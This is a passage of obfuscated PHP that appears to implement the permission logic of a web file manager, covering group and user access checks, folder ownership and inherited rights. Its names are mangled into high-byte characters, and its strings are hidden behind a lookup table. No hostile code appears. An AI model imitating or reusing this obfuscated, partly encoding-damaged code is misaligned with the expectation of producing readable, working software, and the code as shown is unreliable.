$†»ˆÕ¯—[8] . ltrim($ó¥·ÃÍØ[$†»ˆÕ¯—[582]], $†»ˆÕ¯—[8]); $ŞÅ©ºªÑ[] = $ó¥·ÃÍØ; $ı×½Í‚ = count(explode($†»ˆÕ¯—[8], trim($ó¥·ÃÍØ[$†»ˆÕ¯—[582]], $†»ˆÕ¯—[8]))); $Éøµ³ú[] = $ı×½Í‚ + ($ó¥·ÃÍØ[$†»ˆÕ¯—[33]] == $†»ˆÕ¯—[78] ? 0 : 1000); } array_multisort($Éøµ³ú, SORT_ASC, $ŞÅ©ºªÑ); return $ŞÅ©ºªÑ; } private function groupChidldAllRootSource($ÎÍòÉÔ) { $Ùó´œ³É =& $_SERVER[Ùæõ‰Ï’]; $·ßÚæûÆ = Model($Ùó´œ³É[2168])->groupChildrenAll($ÎÍòÉÔ); $üéå³ƒ² = array($Ùó´œ³É[192] => 0, $Ùó´œ³É[569] => array($Ùó´œ³É[7], $·ßÚæûÆ), $Ùó´œ³É[190] => SourceModel::TYPE_GROUP); $Ô†º´Ñ– = Model($Ùó´œ³É[907])->field($Ùó´œ³É[193])->where($üéå³ƒ²)->select(); $Ô†º´Ñ– = array_to_keyvalue($Ô†º´Ñ–, $Ùó´œ³É[12], $Ùó´œ³É[193]); return $Ô†º´Ñ–; } private function authTargetInfo($‰ğ»ØñØ) { $åĞÄÎ¨¯ =& $_SERVER[Ùæõ‰Ï’]; $˜ß˜ê© = array(); $»£Áº¤Ø = array(); $Õà•õÃı = 2 << 25; foreach ($‰ğ»ØñØ as $’¼µİÕ) { $®É³à€‡ = Model($åĞÄÎ¨¯[571])->listData($’¼µİÕ[$åĞÄÎ¨¯[2087]]); if (!$®É³à€‡) { continue; } if ($’¼µİÕ[$åĞÄÎ¨¯[190]] == SourceModel::TYPE_USER) { $ØÔÃ´¡Ì = Model($åĞÄÎ¨¯[577])->getInfoSimpleOuter($’¼µİÕ[$åĞÄÎ¨¯[569]]); if ($ØÔÃ´¡Ì[$åĞÄÎ¨¯[1781]] == $åĞÄÎ¨¯[1286]) { continue; } if ($ØÔÃ´¡Ì[$åĞÄÎ¨¯[1781]] == $åĞÄÎ¨¯[228]) { $ØÔÃ´¡Ì[$åĞÄÎ¨¯[32]] = LNG($åĞÄÎ¨¯[2169]); } } else { $ØÔÃ´¡Ì = Model($åĞÄÎ¨¯[585])->getInfoSimple($’¼µİÕ[$åĞÄÎ¨¯[569]]); } if (!$ØÔÃ´¡Ì) { continue; } $ØÔÃ´¡Ì[$åĞÄÎ¨¯[540]] = $®É³à€‡; $˜ß˜ê©[] = $ØÔÃ´¡Ì; $ü¼ûã–ü = 0; if ($’¼µİÕ[$åĞÄÎ¨¯[190]] == SourceModel::TYPE_GROUP) { $ü¼ûã–ü = $Õà•õÃı * 2; } if ($’¼µİÕ[$åĞÄÎ¨¯[190]] == SourceModel::TYPE_USER) { $ü¼ûã–ü = $Õà•õÃı; } if ($’¼µİÕ[$åĞÄÎ¨¯[190]] == SourceModel::TYPE_USER && $’¼µİÕ[$åĞÄÎ¨¯[569]] == $åĞÄÎ¨¯[228]) { $ü¼ûã–ü = 0; } $»£Áº¤Ø[] = $®É³à€‡[$åĞÄÎ¨¯[487]] + $ü¼ûã–ü; } array_multisort($»£Áº¤Ø, SORT_DESC, $˜ß˜ê©); return $˜ß˜ê©; } public function getAllChildrenByUser($Å×ıŞ¾ú, $×¦ı ôÉ) { $¼İ×äñˆ =& $_SERVER[Ùæõ‰Ï’]; $øÖÅ¡˜´ = Model($¼İ×äñˆ[598])->getInfo($×¦ı ôÉ); if (!$×¦ı ôÉ || !$Å×ıŞ¾ú || !$øÖÅ¡˜´) { return array(); } $úë¨öŠò = Model($¼İ×äñˆ[1430])->sourceInfo($Å×ıŞ¾ú); $º›“‘º = array(); $¨›”Åñ = 1; if ($úë¨öŠò[$¼İ×äñˆ[192]] == $¼İ×äñˆ[228] && $úë¨öŠò[$¼İ×äñˆ[569]] != $¨›”Åñ && $this->groupContainUser($úë¨öŠò[$¼İ×äñˆ[569]], $×¦ı ôÉ)) { foreach ($øÖÅ¡˜´[$¼İ×äñˆ[2170]] as $Ã×­œŠ) { $ÁÎœæíà = Model($¼İ×äñˆ[585])->getInfo($Ã×­œŠ[$¼İ×äñˆ[1979]]); $Ğ¹Ÿ³ = Model($¼İ×äñˆ[598])->getInfoSimpleOuter($×¦ı ôÉ); $Ğ¹Ÿ³[$¼İ×äñˆ[540]] = $Ã×­œŠ[$¼İ×äñˆ[487]]; if (Model($¼İ×äñˆ[571])->authCheckAction($Ã×­œŠ[$¼İ×äñˆ[487]][$¼İ×äñˆ[487]], $¼İ×äñˆ[2000])) { continue; } $ï¯‡×‰ = array($¼İ×äñˆ[32] => $¼İ×äñˆ[1306] . $ÁÎœæíà[$¼İ×äñˆ[32]], $¼İ×äñˆ[193] => $ÁÎœæíà[$¼İ×äñˆ[90]][$¼İ×äñˆ[193]], $¼İ×äñˆ[87] => KodIO::make($ÁÎœæíà[$¼İ×äñˆ[90]][$¼İ×äñˆ[193]]), $¼İ×äñˆ[192] => $¼İ×äñˆ[228], $¼İ×äñˆ[190] => $¼İ×äñˆ[578], $¼İ×äñˆ[33] => $¼İ×äñˆ[616], $¼İ×äñˆ[582] => $ÁÎœæíà[$¼İ×äñˆ[589]], $¼İ×äñˆ[1979] => $ÁÎœæíà[$¼İ×äñˆ[1979]], $¼İ×äñˆ[586] => $ÁÎœæíà[$¼İ×äñˆ[192]], $¼İ×äñˆ[2167] => array($Ğ¹Ÿ³)); $º›“‘º[$ï¯‡×‰[$¼İ×äñˆ[193]]] = $ï¯‡×‰; } } $³Í—ÄÓã = array(); $º›œ€¢ = $this->getAllChildren($Å×ıŞ¾ú); foreach ($º›œ€¢ as $ßàÊ¼Õ) { $§¼şçÑå = !1; foreach ($ßàÊ¼Õ[$¼İ×äñˆ[2167]] as $ÁÁ…¬åñ) { if ($ÁÁ…¬åñ[$¼İ×äñˆ[1781]]) { if ($ÁÁ…¬åñ[$¼İ×äñˆ[1781]] == $×¦ı ôÉ) { $§¼şçÑå = !0; break; } } if ($ÁÁ…¬åñ[$¼İ×äñˆ[1979]]) { if ($this->groupContainUser($ÁÁ…¬åñ[$¼İ×äñˆ[1979]], $×¦ı ôÉ)) { $§¼şçÑå = !0; break; } } } if ($§¼şçÑå) { $³Í—ÄÓã[] = $ßàÊ¼Õ; } $¢¾ŸïÔê = $ßàÊ¼Õ[$¼İ×äñˆ[193]]; if (isset($º›“‘º[$¢¾ŸïÔê])) { $ßàÊ¼Õ[$¼İ×äñˆ[2167]][] = $º›“‘º[$¢¾ŸïÔê][0]; $º›“‘º[$¢¾ŸïÔê] = !1; } } $º›“‘º = array_filter(array_values($º›“‘º)); $³Í—ÄÓã = array_merge($º›“‘º, $³Í—ÄÓã); return $³Í—ÄÓã; } public function setAllChildrenByUser($…İ©ïØ®, $¢«¸¦éÎ, $½‚ä©±) { $™ÚÅ„– =& $_SERVER[Ùæõ‰Ï’]; $½˜ÏÏóŸ = $this->getAllChildrenByUser($…İ©ïØ®, $¢«¸¦éÎ); if (!$½‚ä©± || !$½˜ÏÏóŸ) { return !1; } foreach ($½˜ÏÏóŸ as $½¥ü¶½æ) { $èÆûÛ÷û = array(); foreach ($½¥ü¶½æ[$™ÚÅ„–[2167]] as $Ì°‹Ù±÷) { $¥Ä¹ Ö = $Ì°‹Ù±÷[$™ÚÅ„–[540]]; $ÀìÚÍ­ = $Ì°‹Ù±÷[$™ÚÅ„–[1781]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ñ½åÉ · = $Ì°‹Ù±÷[$™ÚÅ„–[1781]] ? $Ì°‹Ù±÷[$™ÚÅ„–[1781]] : $Ì°‹Ù±÷[$™ÚÅ„–[1979]]; if ($Ì°‹Ù±÷[$™ÚÅ„–[1781]] && $Ì°‹Ù±÷[$™ÚÅ„–[1781]] == $¢«¸¦éÎ) { continue; } $èÆûÛ÷û[] = array($™ÚÅ„–[193] => $½¥ü¶½æ[$™ÚÅ„–[193]], $™ÚÅ„–[190] => $ÀìÚÍ­, $™ÚÅ„–[569] => intval($ñ½åÉ ·), $™ÚÅ„–[2087] => isset($¥Ä¹ Ö[$™ÚÅ„–[475]]) ? intval($¥Ä¹ Ö[$™ÚÅ„–[475]]) : 0, $™ÚÅ„–[2147] => isset($¥Ä¹ Ö[$™ÚÅ„–[2147]]) ? intval($¥Ä¹ Ö[$™ÚÅ„–[2147]]) : -1); } $èÆûÛ÷û[] = array($™ÚÅ„–[193] => $½¥ü¶½æ[$™ÚÅ„–[193]], $™ÚÅ„–[190] => SourceModel::TYPE_USER, $™ÚÅ„–[569] => intval($¢«¸¦éÎ), $™ÚÅ„–[2087] => intval($½‚ä©±), $™ÚÅ„–[2147] => -1); $this->where(array($™ÚÅ„–[491] => $½¥ü¶½æ[$™ÚÅ„–[193]]))->delete(); $this->addAll($èÆûÛ÷û); } return !0; } public function get($Ğçò±¦Ù) { $óíŸÖ•² = $this->getSourceList(array($Ğçò±¦Ù), !0); return $óíŸÖ•²[0]; } public function getSourceList($¿“¹şƒ, $óÎşåÂÄ = false, $ûú“û®— = false) { $Øµ‘µ =& $_SERVER[Ùæõ‰Ï’]; if (!$¿“¹şƒ) { return array(); } $¶‚ØïÎ = Model($Øµ‘µ[1430]); if (!$óÎşåÂÄ && count($¿“¹şƒ) == 1) { $óÎşåÂÄ = array(); $óÎşåÂÄ[$¿“¹şƒ[0]] = $¶‚ØïÎ->sourceInfo($¿“¹şƒ[0]); } if (!$óÎşåÂÄ) { $¾ù†„º = array($Øµ‘µ[491] => array($Øµ‘µ[492], $¿“¹şƒ)); $óÎşåÂÄ = $¶‚ØïÎ->field($Øµ‘µ[2171])->where($¾ù†„º)->select(); $óÎşåÂÄ = array_to_keyvalue($óÎşåÂÄ, $Øµ‘µ[193]); } $³Ì¿ÎÎĞ = $¿“¹şƒ; foreach ($óÎşåÂÄ as $€¥Ä¬¤Ğ => $öÚæú€) { $ÅÑÀ˜¥¢ = $¶‚ØïÎ->parentLevelArray($öÚæú€[$Øµ‘µ[584]]); $³Ì¿ÎÎĞ = array_merge($³Ì¿ÎÎĞ, array($€¥Ä¬¤Ğ), array_reverse($ÅÑÀ˜¥¢)); } $³Ì¿ÎÎĞ = array_values(array_unique($³Ì¿ÎÎĞ)); if (!$³Ì¿ÎÎĞ) { return array(); } $øÄùœ·« = $this->sourceAuthSelect($³Ì¿ÎÎĞ); $¥ó÷ıŸô = array(); foreach ($³Ì¿ÎÎĞ as $ÉˆÔÑÓï) { if (isset($øÄùœ·«[$ÉˆÔÑÓï])) { $¥ó÷ıŸô[$ÉˆÔÑÓï] = $øÄùœ·«[$ÉˆÔÑÓï]; } } $É¼Şñø” = $this->userIsRoot($ûú“û®—); $¢ŞÈÜå = AuthModel::authAll(); $Ğå³èµ = array($Øµ‘µ[488] => $¢ŞÈÜå, $Øµ‘µ[2172] => array($Øµ‘µ[493] => 0, $Øµ‘µ[1985] => $¢ŞÈÜå, $Øµ‘µ[494] => LNG($Øµ‘µ[2173]), $Øµ‘µ[2002] => $Øµ‘µ[2174])); $ÏŸµá€Ô = array(); foreach ($óÎşåÂÄ as $ÉˆÔÑÓï => $ï£€»Î‚) { if ($É¼Şñø” && $GLOBALS[$Øµ‘µ[6]][$Øµ‘µ[1998]]) { $ÏŸµá€Ô[$ÉˆÔÑÓï] = $Ğå³èµ; continue; } $ÏŸµá€Ô[$ÉˆÔÑÓï] = $this->makeSourceAuth($ï£€»Î‚, $¥ó÷ıŸô, $ûú“û®—); } return $ÏŸµá€Ô; } public function authDeepCheck($›øÚùÒ, $Ş×æ¥üè = false) { $õ”çã€É =& $_SERVER[Ùæõ‰Ï’]; $Ş×æ¥üè = $Ş×æ¥üè ? $Ş×æ¥üè : USER_ID; $³¥æñ‚ë = $this->makeAuthDeep($Ş×æ¥üè); if (!in_array($›øÚùÒ, $³¥æñ‚ë[$õ”çã€É[2175]])) { return !1; } $ÃÇçŠ‰¼ = array(); foreach ($³¥æñ‚ë[$õ”çã€É[2176]] as $‚µå±– => $™Èâş–«) { if (!in_array($›øÚùÒ, $™Èâş–«)) { continue; } $ÃÇçŠ‰¼[] = $‚µå±–; } if (!$ÃÇçŠ‰¼) { return !1; } $ã›ÙïÔø = $ÃÇçŠ‰¼ ? $ÃÇçŠ‰¼[0] : $›øÚùÒ; return array($õ”çã€É[488] => -1, $õ”çã€É[540] => array($õ”çã€É[493] => $õ”çã€É[1286], $õ”çã€É[1985] => $õ”çã€É[228], $õ”çã€É[494] => LNG($õ”çã€É[2177]), $õ”çã€É[2002] => $õ”çã€É[2178]), $õ”çã€É[2179] => LNG($õ”çã€É[2180]), $õ”çã€É[2181] => $this->sourceAuthInfo($ã›ÙïÔø)); } protected function makeAuthDeep($óğˆ¡ÃÉ = false) { $´¹Êé©” =& $_SERVER[Ùæõ‰Ï’]; static $¯â÷¦Çá = array(); $óğˆ¡ÃÉ = $óğˆ¡ÃÉ ? $óğˆ¡ÃÉ : USER_ID; if (isset($¯â÷¦Çá[$óğˆ¡ÃÉ])) { return $¯â÷¦Çá[$óğˆ¡ÃÉ]; } $ª¼âÎøÉ = Model($´¹Êé©”[2182])->listData(); $á·¢•ù = array(); foreach ($ª¼âÎøÉ as $‡“ÛÍÛ) { if ($‡“ÛÍÛ[$´¹Êé©”[487]] == 0 && $‡“ÛÍÛ[$´¹Êé©”[2001]] == $´¹Êé©”[91]) { $á·¢•ù[] = $‡“ÛÍÛ[$´¹Êé©”[475]]; } } $—š­Õœ = $this->userGroupParents($óğˆ¡ÃÉ); $ÇŸ®¦± = array($´¹Êé©”[190] => SourceModel::TYPE_USER, $´¹Êé©”[569] => $óğˆ¡ÃÉ); if ($—š­Õœ) { $ÇŸ®¦± = array(array($´¹Êé©”[190] => SourceModel::TYPE_USER, $´¹Êé©”[569] => $óğˆ¡ÃÉ), array($´¹Êé©”[190] => SourceModel::TYPE_GROUP, $´¹Êé©”[569] => array($´¹Êé©”[492], $—š­Õœ)), $´¹Êé©”[1091] => $´¹Êé©”[2081]); } $˜úÅ¢ÅÆ = $this->field($´¹Êé©”[2183])->where($ÇŸ®¦±)->select(); $–ø³«”§ = array(); $Öö®¶Á• = array_to_keyvalue_group($˜úÅ¢ÅÆ, $´¹Êé©”[193]); foreach ($Öö®¶Á• as $øæ¯ğ¨· => $¿†È¡Ê¹) { $º½ì…Îı = $this->authArrayCheck($¿†È¡Ê¹, $óğˆ¡ÃÉ); if ($º½ì…Îı[$´¹Êé©”[488]] > 0) { $–ø³«”§[] = $øæ¯ğ¨· . $´¹Êé©”[12]; } } if ($—š­Õœ) { $Ñ‚Ï–İ« = Model($´¹Êé©”[585]); foreach ($—š­Õœ as $¨ıÀÌä) { $ª§ª¹©¾ = $Ñ‚Ï–İ«->getInfo($¨ıÀÌä); if (!$ª§ª¹©¾ || !is_array($ª§ª¹©¾[$´¹Êé©”[90]])) { continue; } $–ø³«”§[] = $ª§ª¹©¾[$´¹Êé©”[90]][$´¹Êé©”[193]]; } } $Èºó¬—û = array(); $õ‘åÒ = $—š­Õœ; $¼š¾ŞŠ = Model($´¹Êé©”[1430]); $Ñ‚Ï–İ« = Model($´¹Êé©”[585]); $ïˆƒ¯É = array(); $¡åõ¹ÒÛ = array(); $²¨Äíôı = array(); $‚°Ú³ª = array(); if ($–ø³«”§) { $—äœÍ¢ = $¼š¾ŞŠ->where(array($´¹Êé©”[193] => array($´¹Êé©”[492], $–ø³«”§)))->select(); foreach ($—äœÍ¢ as $­ÛÍÌ²‹) { $ğÂû§Ú˜ = $¼š¾ŞŠ->parentLevelArray($­ÛÍÌ²‹[$´¹Êé©”[584]]); $Èºó¬—û = array_merge($Èºó¬—û, $ğÂû§Ú˜); $õ‘åÒ[] = $­ÛÍÌ²‹[$´¹Êé©”[569]]; $ïˆƒ¯É[$­ÛÍÌ²‹[$´¹Êé©”[193]]] = $ğÂû§Ú˜; $¡åõ¹ÒÛ[$­ÛÍÌ²‹[$´¹Êé©”[193]]] = $­ÛÍÌ²‹[$´¹Êé©”[569]]; } } $õ‘åÒ = array_values(array_unique($õ‘åÒ)); $ÛÈ‘ùí = $õ‘åÒ; foreach ($ÛÈ‘ùí as $¨ıÀÌä) { $ª§ª¹©¾ = $Ñ‚Ï–İ«->getInfo($¨ıÀÌä); $ğÂû§Ú˜ = $¼š¾ŞŠ->parentLevelArray($ª§ª¹©¾[$´¹Êé©”[584]]); $õ‘åÒ = array_merge($õ‘åÒ, $ğÂû§Ú˜); } $õ‘åÒ = array_values(array_unique($õ‘åÒ)); foreach ($õ‘åÒ as $¨ıÀÌä) { $ª§ª¹©¾ = $Ñ‚Ï–İ«->getInfo($¨ıÀÌä); $Èºó¬—û[] = $ª§ª¹©¾[$´¹Êé©”[90]][$´¹Êé©”[193]]; $²¨Äíôı[$¨ıÀÌä] = $ª§ª¹©¾[$´¹Êé©”[90]][$´¹Êé©”[193]]; $‚°Ú³ª[$¨ıÀÌä] = $¼š¾ŞŠ->parentLevelArray($ª§ª¹©¾[$´¹Êé©”[584]]); } foreach ($ïˆƒ¯É as $“öºí•œ => $£×Ô”á) { $Èˆ©ŠÀ = $¡åõ¹ÒÛ[$“öºí•œ]; if (!$Èˆ©ŠÀ || !$²¨Äíôı[$Èˆ©ŠÀ]) { continue; } $¥¾¤çæ = array(); foreach ($‚°Ú³ª[$Èˆ©ŠÀ] as $¨ıÀÌä) { $¥¾¤çæ[] = $²¨Äíôı[$¨ıÀÌä]; } $ïˆƒ¯É[$“öºí•œ] = array_merge($¥¾¤çæ, $£×Ô”á); } $Èºó¬—û = array_values(array_unique($Èºó¬—û)); $¦š­¯ıÓ = array($´¹Êé©”[2175] => $Èºó¬—û, $´¹Êé©”[2176] => $ïˆƒ¯É); $¯â÷¦Çá[$óğˆ¡ÃÉ] = $¦š­¯ıÓ; return $¦š­¯ıÓ; } private function makeSourceAuth($ßùçÛå, $ì÷ÎĞåÄ, $‚ÎÃ¯¢ = false) { $Æ­ãÅ›© =& $_SERVER[Ùæõ‰Ï’]; $»à€ı–™ = $Æ­ãÅ›©[91]; $ğ€»¦ğ¥ = $ßùçÛå[$Æ­ãÅ›©[569]]; $««Å†æ = $ßùçÛå[$Æ­ãÅ›©[190]] == SourceModel::TYPE_GROUP; $æ¼¢¤ã— = $««Å†æ ? $this->groupRootAuth($ğ€»¦ğ¥, $‚ÎÃ¯¢) : !1; if ($æ¼¢¤ã— && Model($Æ­ãÅ›©[571])->authCheckAction($æ¼¢¤ã—[$Æ­ãÅ›©[487]], $Æ­ãÅ›©[2000])) { return $this->groupAuthInfo($æ¼¢¤ã—, $ğ€»¦ğ¥); } $µ Ş‰Ãô = Model($Æ­ãÅ›©[1430])->parentLevelArray($ßùçÛå[$Æ­ãÅ›©[584]]); $µ Ş‰Ãô = array_merge(array($ßùçÛå[$Æ­ãÅ›©[193]]), array_reverse($µ Ş‰Ãô)); $ï½Åûé = !1; foreach ($µ Ş‰Ãô as $¨Î†Ûøº) { if (!isset($ì÷ÎĞåÄ[$¨Î†Ûøº])) { continue; } $ó¸ùòÚ = $this->authMake($ì÷ÎĞåÄ[$¨Î†Ûøº], $‚ÎÃ¯¢); if ($ó¸ùòÚ[$Æ­ãÅ›©[540]]) { $ï½Åûé = $ó¸ùòÚ; break; } } if (!$««Å†æ) { return $ï½Åûé; } if (!$ï½Åûé && $æ¼¢¤ã—) { $ï½Åûé = $this->groupAuthInfo($æ¼¢¤ã—, $ğ€»¦ğ¥); } if (!$ï½Åûé) { $şÚùÖ°ô = Model($Æ­ãÅ›©[585])->getInfo($ğ€»¦ğ¥); $çÑªö¸ = explode($Æ­ãÅ›©[50], trim($şÚùÖ°ô[$Æ­ãÅ›©[584]], $Æ­ãÅ›©[50])); $çÑªö¸ = array_reverse($çÑªö¸); foreach ($çÑªö¸ as $²óÇí²š) { if ($²óÇí²š == $Æ­ãÅ›©[228] || $²óÇí²š == $»à€ı–™) { continue; } $ïÊÇÊ¢ = $this->groupRootAuth($²óÇí²š, $‚ÎÃ¯¢); if (!$ïÊÇÊ¢) { continue; } $ï½Åûé = $this->groupAuthInfo($ïÊÇÊ¢, $²óÇí²š); break; } } if (!$ï½Åûé || $ï½Åûé[$Æ­ãÅ›©[488]] <= 0) { $æı‰´ïä = $this->authDeepCheck($ßùçÛå[$Æ­ãÅ›©[193]], $‚ÎÃ¯¢); if ($æı‰´ïä) { $ï½Åûé = $æı‰´ïä; } } return $ï½Åûé; } private function userIsRoot($ŸŒá­ù¡ = false) { $´ÁîŸ =& $_SERVER[Ùæõ‰Ï’]; if (!$ŸŒá­ù¡ && KodUser::isRoot()) { return !0; } $Ÿû¢¼ö = Model($´ÁîŸ[598])->getInfo($ŸŒá­ù¡); $‡§À¤Ç­ = Model($´ÁîŸ[2184])->listData($Ÿû¢¼ö[$´ÁîŸ[2185]]); if ($‡§À¤Ç­ && $‡§À¤Ç­[$´ÁîŸ[575]][$´ÁîŸ[2186]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ƒÔÒÛ¯±) { $ìÑãúû£ =& $_SERVER[Ùæõ‰Ï’]; $·¿é¢÷ = Model($ìÑãúû£[1430]); $àèó†… = $·¿é¢÷->sourceInfo($ƒÔÒÛ¯±); if (!$àèó†…) { return !1; } $·¿é¢÷->groupPathDisplay($àèó†…); $Ò±ğ‘¥Ú = array($àèó†…); $Ò±ğ‘¥Ú = $·¿é¢÷->_listAppendPath($Ò±ğ‘¥Ú); $àèó†… = $Ò±ğ‘¥Ú[0]; $äÒıÏåÜ = $àèó†…[$ìÑãúû£[582]]; if (isset($àèó†…[$ìÑãúû£[590]])) { $ˆûÉ¬‹ = explode($ìÑãúû£[8], trim($àèó†…[$ìÑãúû£[582]], $ìÑãúû£[8])); array_shift($ˆûÉ¬‹); $äÒıÏåÜ = $àèó†…[$ìÑãúû£[588]] . $ìÑãúû£[2187] . implode($ìÑãúû£[8], $ˆûÉ¬‹); } return array($ìÑãúû£[494] => $àèó†…[$ìÑãúû£[32]], $ìÑãúû£[87] => KodIO::make($àèó†…[$ìÑãúû£[193]]), $ìÑãúû£[2188] => $äÒıÏåÜ); } private function groupAuthInfo($çöï‘Ò», $¬ÍÀ€£ı) { $Ë›œØ† =& $_SERVER[Ùæõ‰Ï’]; $õ´ß‘ú² = Model($Ë›œØ†[585])->getInfo($¬ÍÀ€£ı); return array($Ë›œØ†[2189] => intval($çöï‘Ò»[$Ë›œØ†[487]]), $Ë›œØ†[2172] => $çöï‘Ò», $Ë›œØ†[2190] => LNG($Ë›œØ†[2191]), $Ë›œØ†[2181] => array($Ë›œØ†[494] => $õ´ß‘ú²[$Ë›œØ†[32]], $Ë›œØ†[87] => KodIO::make($õ´ß‘ú²[$Ë›œØ†[90]][$Ë›œØ†[193]]), $Ë›œØ†[2188] => $õ´ß‘ú²[$Ë›œØ†[589]])); } protected function groupRootAuth($¦ƒĞáÏß, $Ú‡˜¬˜ = false) { $Ç»€èù =& $_SERVER[Ùæõ‰Ï’]; $Ú‡˜¬˜ = $Ú‡˜¬˜ ? $Ú‡˜¬˜ : USER_ID; $Ô—ÃûÄ± = $Ú‡˜¬˜ . $Ç»€èù[2192] . $¦ƒĞáÏß; static $ÈÉ›ãàª = array(); if (isset($ÈÉ›ãàª[$Ô—ÃûÄ±])) { return $ÈÉ›ãàª[$Ô—ÃûÄ±]; } $ÈŞ×“·Ã = Model($Ç»€èù[585])->getInfo($¦ƒĞáÏß); $„ Ùüœ  = $this->userGroupList($Ú‡˜¬˜); $²Ãßõ„¦ = isset($„ Ùüœ [$¦ƒĞáÏß]) ? $„ Ùüœ [$¦ƒĞáÏß][$Ç»€èù[487]] : !1; if ($²Ãßõ„¦ && Model($Ç»€èù[571])->authCheckAction($²Ãßõ„¦[$Ç»€èù[487]], $Ç»€èù[2000])) { $ÈÉ›ãàª[$Ô—ÃûÄ±] = $²Ãßõ„¦; return $²Ãßõ„¦; } $×ÛÙ‹Õ = $this->sourceAuthSelect($ÈŞ×“·Ã[$Ç»€èù[90]][$Ç»€èù[193]]); $ë£éÙ = $×ÛÙ‹Õ ? $this->authMake($×ÛÙ‹Õ, $Ú‡˜¬˜) : !1; $­†«€é = $ë£éÙ ? $ë£éÙ[$Ç»€èù[540]] : !1; $ÈÉ›ãàª[$Ô—ÃûÄ±] = $­†«€é ? $­†«€é : $²Ãßõ„¦; return $ÈÉ›ãàª[$Ô—ÃûÄ±]; } public function authOwnerApply($©¥ı×±) { $‚í×àƒŠ =& $_SERVER[Ùæõ‰Ï’]; if (empty($©¥ı×±[$‚í×àƒŠ[487]]) || isset($©¥ı×±[$‚í×àƒŠ[2193]]) && $©¥ı×±[$‚í×àƒŠ[2193]]) { return $©¥ı×±; } if (AuthModel::authCheckRoot($©¥ı×±[$‚í×àƒŠ[487]][$‚í×àƒŠ[488]])) { return $©¥ı×±; } $ğªÄƒ±Á = Model($‚í×àƒŠ[1430])->parentLevelArray($©¥ı×±[$‚í×àƒŠ[584]]); $ğªÄƒ±Á = array_merge(array($©¥ı×±[$‚í×àƒŠ[193]]), array_reverse($ğªÄƒ±Á)); $åçı–ä = $this->sourceAuthSelect($ğªÄƒ±Á); $ü¯‡şĞñ = array(); $—ñ’‡‹ = array(); foreach ($åçı–ä as $šœõÆ¸£ => $ŸÚÜ«ıÚ) { $½øâ•Õù = $this->authFolderOwnerUser($ŸÚÜ«ıÚ); $ü¯‡şĞñ[$šœõÆ¸£] = $½øâ•Õù; $—ñ’‡‹ = array_merge($—ñ’‡‹, $½øâ•Õù[$‚í×àƒŠ[662]]); if ($½øâ•Õù[$‚í×àƒŠ[2194]]) { break; } } if (count($—ñ’‡‹) == 0) { $—ñ’‡‹ = $this->authFolderOwnerGroup($©¥ı×±[$‚í×àƒŠ[569]]); } $—ñ’‡‹ = array_unique($—ñ’‡‹); if (AuthModel::authCheckRoot($©¥ı×±[$‚í×àƒŠ[487]][$‚í×àƒŠ[488]])) { $—ñ’‡‹[] = USER_ID; } $©¥ı×±[$‚í×àƒŠ[487]][$‚í×àƒŠ[2195]] = Model($‚í×àƒŠ[577])->userListInfo($—ñ’‡‹); return $©¥ı×±; } private function authFolderOwnerGroup($ãíêüÓ„) { $‘äÍ£õ› =& $_SERVER[Ùæõ‰Ï’]; $ëå…ëÙ = Model($‘äÍ£õ›[2073])->where(array($‘äÍ£õ›[1979] => $ãíêüÓ„))->select(); $¬¸àôŸø = array(); if (!$ëå…ëÙ) { return $¬¸àôŸø; } foreach ($ëå…ëÙ as $»ÙŒ´ß¿) { $´Ó±å°º = $this->authInfo($»ÙŒ´ß¿); if (AuthModel::authCheckRoot($´Ó±å°º[$‘äÍ£õ›[487]])) { $¬¸àôŸø[] = $»ÙŒ´ß¿[$‘äÍ£õ›[1781]]; } } return $¬¸àôŸø; } private function authFolderOwnerUser($şÔÚàƒ“) { $²¬£¼Ò‰ =& $_SERVER[Ùæõ‰Ï’]; $±ı¤ÆÓ» = array(); $ÒÜò—ï‚ = !1; foreach ($şÔÚàƒ“ as $¤î˜¶İ‘) { $±†•¾Û‚ = $this->authInfo($¤î˜¶İ‘); if ($¤î˜¶İ‘[$²¬£¼Ò‰[569]] == $²¬£¼Ò‰[228]) { $ÒÜò—ï‚ = !0; } if ($¤î˜¶İ‘[$²¬£¼Ò‰[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($±†•¾Û‚[$²¬£¼Ò‰[487]])) { $±ı¤ÆÓ»[] = $¤î˜¶İ‘[$²¬£¼Ò‰[569]]; } } } return array($²¬£¼Ò‰[662] => $±ı¤ÆÓ», $²¬£¼Ò‰[2194] => $ÒÜò—ï‚); } public function authMake($ÛğëÀŸÔ, $·³à’ó = false) { $¢Í¢¯×ç =& $_SERVER[Ùæõ‰Ï’]; $İ½éû = $this->authArrayCheck($ÛğëÀŸÔ, $·³à’ó); if ($İ½éû[$¢Í¢¯×ç[2196]]) { $İ½éû[$¢Í¢¯×ç[2196]] = $this->sourceAuthInfo($İ½éû[$¢Í¢¯×ç[2196]]); } return $İ½éû; } public function authArrayCheck($¸ÆáÛ•, $”ô»³— = false) { $ÖÍûıç« =& $_SERVER[Ùæõ‰Ï’]; if (!$¸ÆáÛ•) { return array($ÖÍûıç«[488] => 0, $ÖÍûıç«[540] => !1); } $”ô»³— = $”ô»³— ? $”ô»³— : USER_ID; $¤äß·Æ = 0; $Ó¥İ…Šı = 0; $ò Â…Âé = 0; $Î´Âá ¼ = 0; $ÔË×œ° = 0; $£»Ã°Ğò = 0; $ş€Á£óÇ = 1000; $§²ÎÆÚ£ = 0; $Œ§²’‰° = 0; $·£‘›µ™ = 0; $³Ô±é¿ = 0; $ö¤÷øàŒ = array($ÖÍûıç«[193] => 0); foreach ($¸ÆáÛ• as $ö¤÷øàŒ) { $÷³Õè†ñ = $this->authInfo($ö¤÷øàŒ); if (!$÷³Õè†ñ) { continue; } $ƒÒ™Ú¥ = $ö¤÷øàŒ[$ÖÍûıç«[569]]; $‹¬Ğ¯ˆ± = intval($÷³Õè†ñ[$ÖÍûıç«[487]]); if ($ö¤÷øàŒ[$ÖÍûıç«[190]] == SourceModel::TYPE_USER && $ƒÒ™Ú¥ == $”ô»³—) { $¤äß·Æ = !0; $ò Â…Âé = $÷³Õè†ñ; $Ó¥İ…Šı = $‹¬Ğ¯ˆ±; } else { if ($ö¤÷øàŒ[$ÖÍûıç«[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ƒÒ™Ú¥, $”ô»³—)) { $Î´Âá ¼ = !0; $‘ıÛî‘ = $this->groupStepToUserGroup($ƒÒ™Ú¥, $”ô»³—); if ($‘ıÛî‘ < $ş€Á£óÇ) { $ş€Á£óÇ = 